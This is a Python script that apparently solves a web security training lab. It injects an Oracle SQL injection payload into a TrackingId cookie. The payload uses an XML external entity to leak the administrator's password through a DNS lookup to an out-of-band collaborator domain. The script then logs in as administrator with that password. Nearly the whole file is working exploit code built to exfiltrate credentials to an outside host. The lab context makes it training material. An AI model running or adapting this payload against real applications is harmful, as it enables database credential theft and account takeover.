# kxltj6emmx8mi4y7ueeh0gn7kyqoed.oastify.com

import requests
import re
from bs4 import BeautifulSoup

def get_trackingid(session, domain):
    session.get(domain)
    cookie = session.cookies.get_dict()
    print(cookie)
    tracking_id = cookie['TrackingId']
    return tracking_id

def get_csrf(session, domain):
    login_url = domain + '/login'
    r = session.get(login_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def get_credential(session, domain, burp_client, tracking_id):
    payload = tracking_id + '''' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(Select password from users where username = 'administrator')||'.{}/"> %remote;]>'),'/l') FROM dual-- '''.format(burp_client)
    r = session.get(domain, cookies={'TrackingId': requests.utils.quote(payload, safe='/:?=')})

def solve_lab(session, domain, username, password, csrf):
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    r = session.post(domain + '/login', data = data)
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not Solved')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    burp_client = input('Enter your Burp Collaborator Client: ')
    session = requests.Session()
    try:
        tracking_id = get_trackingid(session, domain)
        get_credential(session, domain, burp_client, tracking_id)
        password = input('Enter the password you get from the DNS lookup: ')
        csrf = get_csrf(session, domain)
        solve_lab(session, domain, 'administrator', password, csrf)
    except requests.exceptions.ConnectionError:
        print('Error connecting to the server. Check your URL.')
        